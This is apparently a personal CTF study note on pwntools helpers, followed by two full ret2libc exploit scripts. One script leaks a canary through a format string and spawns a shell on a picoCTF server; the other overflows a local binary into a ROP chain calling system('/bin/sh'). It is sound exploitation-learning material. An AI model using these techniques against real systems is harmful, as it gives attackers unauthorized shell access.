# func
## `recv(6)`  
comination of `recvline()`, trim and padding
```python
a = recvline()
print(len(a))
# 6
recv(6).ljust(8,b"\x00")
```
## type: `bytes` and `len()`
You can use len() to bytes value.  
`len()` can adjust to each type and calculate a length of value as the type.  
```python
a = 123
b ="123"
c = 0x123
d = b'123\x89\xe3\x81\xad456'

# print("int : " + len(a)) #error
print("string : " + str(len(b)))
# print("hex : " + str(len(c))) #error
print("bytes : " + str(len(d)))

#string : 3
#bytes : 10
```
## `u64`  
In pwntools, u64 refers to an "unpack 64-bit" operation, and it's used to convert a byte string (sequence of 8 bytes) into an unsigned 64-bit integer.  
The `u64` function is part of pwntools' utility functions for binary data manipulation.  
https://docs.pwntools.com/en/stable/util/packing.html
### why `64`?  
This is likely the reason.
```zsh
$ file vuln_patched
vuln_patched: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.27.so, for GNU/Linux 3.2.0, BuildID[sha1]=e5dba3e6ed29e457cd104accb279e127285eecd0, not stripped
```
### why `.ljust(8,b"\x00")`  
This is because that "unpack" requires a buffer of 8 bytes.
```python
## debug
# res = p.recvline()
# print(res)           # b'0z\x8e\x99\xcd\x7f\n'
# print(len(res))      # 7

res = p.recv(6)
print(res)                                          # b'0z\x8e\x99\xcd\x7f'
print(res.ljust(8,b"\x00"))                         # b'0z\x8e\x99\xcd\x7f\x00\x00'
print(u64(res.ljust(8,b"\x00")))                    # 140521021274672 ... 64 bit integer
# print(u64(res.ljust(9,b"\x00")))                  # error: unpack requires a buffer of 8 bytes
# print(u64(res.ljust(16,b"\x00")))                 # error: unpack requires a buffer of 8 bytes
# print("debug" + u64(res.ljust(8,b"\x00")))        # error: str + byte
print("debug : " + hex(u64(res.ljust(8,b"\x00"))))  # 0x7fcd998e7a30
```
## next(libc.search(b'/bin/sh'))
```python
libc = ELF('./libc-2.19.so-HOGEHOGEHOGE')
next(libc.search(b'/bin/sh'))
```
This is a function that searches for the first occurrence of the string `/bin/sh` within the libc binary and returns its address.

**`libc.search(b'/bin/sh')`**  
This searches for the string `/bin/sh` inside the libc library and returns the address where it is first found.

**`b'/bin/sh'`:**  
This is a byte string representing the literal `/bin/sh` that we're searching for in the binary.

**`next(...)`:**  
The `search()` method returns a generator (or iterable) of addresses where` /bin/sh` is found. The `next()` function is used to retrieve just the first address from this list.

In summary, `next(libc.search(b'/bin/sh'))` is a concise way to get the address of the first occurrence of `/bin/sh` in the libc binary.

# Example
## ret2libc 1
```python
from pwn import *

exe = ELF("./vuln")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])

    else:
        r = remote("jupiter.challenges.picoctf.org", 15815)

    return r

def main():

    r = conn()
    # r = gdb.debug(exe.path, '''
    #     break *0x080487e9
    #     continue
    #     ''')

    if args.LOCAL:
        fixed_random = -2495

    else:
        fixed_random = -3727

    stage1(r, fixed_random)

    res = r.recvuntil(b'Name? ')
    print("stdout : ", res)

    canary_stack_cookie_str = stage2_getCanary(r)

    stage1(r, fixed_random)

    res = r.recvuntil(b'Name? ')
    print("stdout : ", res)

    puts_got_context = stage2_getGOT(r, canary_stack_cookie_str)

    res = r.recvuntil(b'Name? ')
    print("stdout : ", res)

    stage2_invokeShell(r, canary_stack_cookie_str, puts_got_context)

    r.interactive()

def stage1(r, fixed_random):
    print("[DEBUG] ------- stage1 -------")

    print(r.recvuntil(b'like to guess?'))

    payload = str(fixed_random).encode()

    r.sendline(payload)
    print("stdin  : ", payload)

    res = r.recvline()
    print("stdout : ", res)

    res = r.recvline()
    print("stdout : ", res)

    if b'Nope' in res:
        print("[DEBUG] No Hit!!!")
        exit()
    else:
        print("[DEBUG] Hit!!!!!!")

def stage2_getCanary(r):
    print("[DEBUG] ------- stage2_getCanary -------")

    payload = b"%135$x"
    r.sendline(payload)
    print("stdin  : ", payload)

    res = r.recvuntil(b"Congrats: ")
    print("stdout : ", res)

    res = r.recvline()
    print("stdout : ", res)

    canary_str=str(res) # str: b'fdc8cf00\n'
    return canary_str[2:-3] # str: fdc8cf00

def stage2_getGOT(r, canary_stack_cookie_str):
    print("[DEBUG] ------- stage2_checkGOT -------")

    decimal_int = int(canary_stack_cookie_str, 16)

    payload2 = b"A" * 4 * 128 + p32(decimal_int)

    payload_canary_cookie_to_ret = b"B" * 4 * 3

    payload2 += payload_canary_cookie_to_ret

    puts_plt = exe.plt['puts']
    puts_got = exe.got['puts']
    # puts_return_address = exe.functions['win'].address
    # puts_plt = 0x080484c0
    # puts_got = 0x08049fdc
    puts_return_address = 0x0804876e

    print("puts_plt : ", puts_plt, " ", p32(puts_plt))
    print("puts_got : ", puts_got, " ", p32(puts_got))

    payload2 += p32(puts_plt) + p32(puts_return_address) + p32(puts_got)

    r.sendline(payload2)
    print("stdin  : ", payload2)

    res = r.recvline()
    print("stdout : ", res)

    res = r.recvline()
    print("stdout : ", res)
    res = r.recvline()
    print("stdout : ", res)

    puts_got_context = res[0:4]
    print("[DEBUG] puts_got_context: ", puts_got_context)
    print("[DEBUG] puts_got_context: ", hex(u32(puts_got_context)))

    return puts_got_context

def stage2_invokeShell(r, canary_stack_cookie_str, puts_got_context):
    print("[DEBUG] ------- stage2_invokeShell -------")

    decimal_int = int(canary_stack_cookie_str, 16)

    payload2 = b"A" * 4 * 128 + p32(decimal_int)

    payload_canary_cookie_to_ret = b"B" * 4 * 3

    payload2 += payload_canary_cookie_to_ret

    if args.LOCAL:
        # got_plt > puts 0xf7dca2a0
        # libc6_2.35-0ubuntu3.5_i386
        # c.f. https://libc.blukat.me/?q=puts%3A0xf7dca2a0&l=libc6_2.35-0ubuntu3.5_i386
        offset_str_bin_sh = 0x149e35
        offset_system = -0x2b130
    else:
        # got_plt > puts 0xf7e4b560
        # libc6-i386_2.27-3ubuntu1.5_amd64
        # c.f. https://libc.blukat.me/?q=puts%3A0xf7e4b560&l=libc6-i386_2.27-3ubuntu1.5_amd64
        offset_str_bin_sh = 0x11447b
        offset_system = -0x2a650

    puts_return_address = 0x0804876e

    print("[DEBUG] ", hex(u32(puts_got_context) + offset_system))
    print("[DEBUG] ", hex(puts_return_address))
    print("[DEBUG] ", hex(u32(puts_got_context) + offset_str_bin_sh))

    payload2 += p32(u32(puts_got_context) + offset_system)
    payload2 += p32(puts_return_address)
    payload2 += p32(u32(puts_got_context) + offset_str_bin_sh)

    r.sendline(payload2)
    print("stdin  : ", payload2)

if __name__ == "__main__":
    main()

```
## ret2libc 2
```python
from pwn import *

exe = ELF("./cheer_msg_patched")

context.binary = exe

def conn():
    # if args.LOCAL:
    #     r = process([exe.path])

    # else:
    #     r = remote("XXX.example.com", 15815)
    
    r = process([exe.path])

    return r

def main():

    r = conn()
    # r = gdb.debug(exe.path, '''
    #     break *0x8048633
    #     continue
    #     ''')

    puts_plt = exe.plt['printf']
    puts_got = exe.got['printf']
    print("puts_plt : ", puts_plt, " ", p32(puts_plt))
    print("puts_got : ", puts_got, " ", p32(puts_got))

    res = r.recvuntil(b'Length >> ')
    print("stdout : ", res)

    payload1 = b"-100"

    r.sendline(payload1)
    print("stdout : ", res)

    res = r.recvuntil(b'Name >> ')
    print("stdout : ", res)

    rop_init =  0x08048409 # : pop ebx ; ret
    addr_main = 0x080485ca # : main()
    payload2 = (b"A" * 48
                # + p32(rop_init) # stack allignment. No need in this case
                + p32(puts_plt)  # printf@plt
                + p32(addr_main) # return address of printf@plt
                + p32(puts_got)  # argument of printf@plt; target value in a address for display with printf@plt
    )

    r.sendline(payload2)
    print("stdout : ", res)

    r.recvuntil(b'Message : ')
    print("stdout : ", res)

    r.recvline()
    print("stdout : ", res)

    res = r.recv(4)
    print("stdout : ", res)
    bin_addr_libc_printf = u32(res)
    print("[DEBUG] addr_libc_printf: ", hex(bin_addr_libc_printf))

    # second main
    res = r.recvuntil(b'Length >> ')
    print("stdout : ", res)

    payload3 = b"-100"

    r.sendline(payload3)
    print("stdout : ", res)

    res = r.recvuntil(b'Name >> ')
    print("stdout : ", res)

    # rop_init =  0x08048409 # : pop ebx ; ret
    addr_main = 0x080485ca # : main()

    # Method 1: search offset using web source
    ## https://libc.blukat.me/?q=printf%3A0&l=libc6_2.19-0ubuntu6.9_i386
    ## search words: "printf" and 0
    ## grep "2.19-0ubuntu6.9" and 32bit info, which are shown following output
    ### $ strings ./libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368 | grep -i version
    ### $ file libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368
    info("-----------------------")
    offset_system = -0xd100 # printf()-> system()
    offset_str_bin_sh = 0x11343c # printf()-> str_bin_sh
    info("Method 1 - offset_system: "       + hex(offset_system))
    info("Method 1 - offset_str_bin_sh: "   + hex(offset_str_bin_sh))
    info("-----------------------")

    # Method 2: search offset using a local binary and pwntools
    info("-----------------------")
    libc = ELF('./libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368')
    info("Method 2 - printf: " + hex(libc.symbols['printf']))
    info("Method 2 - system: " + hex(libc.symbols['system']))
    info("Method 2 - bin/sh: " + hex(next(libc.search(b'/bin/sh'))))
    offset_system = libc.symbols['system'] - libc.symbols['printf']
    offset_str_bin_sh = next(libc.search(b'/bin/sh')) - libc.symbols['printf']
    info("Method 2 - offset_system: " + hex(offset_system))
    info("Method 2 - offset_str_bin_sh: " + hex(offset_str_bin_sh))
    info("-----------------------")

    ## Method 3
    info("-----------------------")
    libc = ELF('./libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368')
    offset_libc_printf = libc.symbols['printf']
    libc.address = bin_addr_libc_printf - offset_libc_printf
    info("Method 3 - addr_libc_base: " + hex(libc.address))
    addr_libc_str_sh = next(libc.search(b'/bin/sh'))
    info("-----------------------")

    # Method 1 or 2
    payload4 = (b"A" * 48
                # + p32(rop_init) # stack allignment. No need in this case
                + p32(bin_addr_libc_printf + offset_system)  # system@plt
                + p32(addr_main) # return address of system@plt
                + p32(bin_addr_libc_printf + offset_str_bin_sh)  # argument of system@plt
    )

    # # Method 3
    libc_rop = ROP(libc)
    # libc_rop.execve(addr_libc_str_sh, 0, 0) # error
    libc_rop.system(addr_libc_str_sh, 0, 0)
    payload4 = b"A" * 48 + libc_rop.chain()

    r.sendline(payload4)
    print("stdout : ", res)

    r.interactive()

if __name__ == "__main__":
    main()
```